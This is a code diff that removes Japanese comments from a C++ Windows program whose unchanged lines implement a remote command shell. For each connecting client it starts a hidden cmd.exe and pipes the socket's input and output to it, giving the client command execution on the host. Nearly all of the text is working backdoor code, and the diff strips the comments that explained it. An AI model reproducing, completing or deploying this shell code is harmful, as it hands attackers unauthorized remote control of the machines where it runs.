@@ -25,11 +25,9 @@ BOOL WINAPI ConsoleHandler(DWORD dwType) {
     return FALSE;
 }
 
-// クライアント処理スレッド
 DWORD WINAPI ClientThread(LPVOID lpParam) {
     SOCKET client_sock = (SOCKET)lpParam;
 
-    // クライアント情報取得
     struct sockaddr_in addr;
     int len = sizeof(addr);
     getpeername(client_sock, (sockaddr*)&addr, &len);
@@ -37,7 +35,6 @@ DWORD WINAPI ClientThread(LPVOID lpParam) {
     inet_ntop(AF_INET, &addr.sin_addr, ip, INET_ADDRSTRLEN);
     printf("[+] 接続: %s:%d\n", ip, ntohs(addr.sin_port));
 
-    // シェルプロセス（cmd.exe）をパイプで作成
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
     HANDLE hStdinRead, hStdinWrite, hStdoutRead, hStdoutWrite;
     if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0) ||
@@ -47,7 +44,6 @@ DWORD WINAPI ClientThread(LPVOID lpParam) {
         return 1;
     }
 
-    // 子プロセス起動
     PROCESS_INFORMATION pi = { 0 };
     STARTUPINFOA si = { sizeof(STARTUPINFOA) };
     si.dwFlags = STARTF_USESTDHANDLES;
@@ -55,7 +51,6 @@ DWORD WINAPI ClientThread(LPVOID lpParam) {
     si.hStdOutput = hStdoutWrite;
     si.hStdError = hStdoutWrite;
 
-    // cmd.exe を起動（/K で終了しない）
     char cmdLine[] = "cmd.exe /K";
     if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
@@ -66,12 +61,10 @@ DWORD WINAPI ClientThread(LPVOID lpParam) {
         return 1;
     }
 
-    // 不要なハンドルを閉じる（子プロセス側は保持）
     CloseHandle(hStdinRead);
     CloseHandle(hStdoutWrite);
     CloseHandle(pi.hThread);
 
-    // 双方向通信のためのスレッド（stdout -> socket）
     HANDLE hReadThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
         auto* args = (std::pair<SOCKET, HANDLE>*)p;
         SOCKET s = args->first;
@@ -84,24 +77,20 @@ DWORD WINAPI ClientThread(LPVOID lpParam) {
         return 0;
     }, new std::pair<SOCKET, HANDLE>(client_sock, hStdoutRead), 0, NULL);
 
-    // メインループ：socket -> stdin
     char buffer[BUFFER_SIZE];
     while (keep_running) {
         int recv_len = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
         if (recv_len <= 0) break;
         buffer[recv_len] = '\0';
 
-        // "exit" で切断
         if (strcmp(buffer, "exit\r\n") == 0 || strcmp(buffer, "exit\n") == 0) {
             break;
         }
 
-        // コマンドを子プロセスのstdinに書き込む
         DWORD written;
         WriteFile(hStdinWrite, buffer, recv_len, &written, NULL);
     }
 
-    // クリーンアップ
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess);
     CloseHandle(hStdinWrite);
